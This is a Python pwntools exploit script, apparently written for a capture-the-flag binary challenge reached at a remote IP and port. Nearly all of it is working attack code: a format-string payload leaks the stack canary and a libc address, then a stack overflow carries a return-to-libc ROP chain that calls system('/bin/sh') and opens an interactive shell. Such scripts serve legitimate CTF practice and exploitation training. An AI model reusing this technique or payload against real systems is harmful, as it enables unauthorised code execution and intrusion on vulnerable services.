#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11101 ./challenge/chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
# host = args.HOST or 'localhost'
# port = int(args.PORT or 11101)

host = args.HOST or '165.22.101.113'
port = int(args.PORT or 11101)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")

# libc = exe.libc

def add(msg):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",msg)

def write(msg):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",msg)

# p = '%6$p %7$p %8$p'
# p = '%9$p %10$p'
# p = '%11$p %12$p'
# p = '%13$p %14$p'
p = '%11$p %13$p'
add(p)

leak = io.recvline().split(" ")
canary = int(leak[1],16)
print hex(canary)
print hex(int(leak[2],16) )
libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] -234 -9
print hex(libc.address )

# pop_rdi = libc.address + 0x00000000000215bf
pop_rdi = libc.search(asm("pop rdi ; ret")).next()

# p = 'a'*64
# p = 'a'*48
p = 'a'*40
p += p64(canary)
p += p64(0)
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rdi+1) # ret
p += p64(libc.sym['system'])
write(p)

io.interactive()
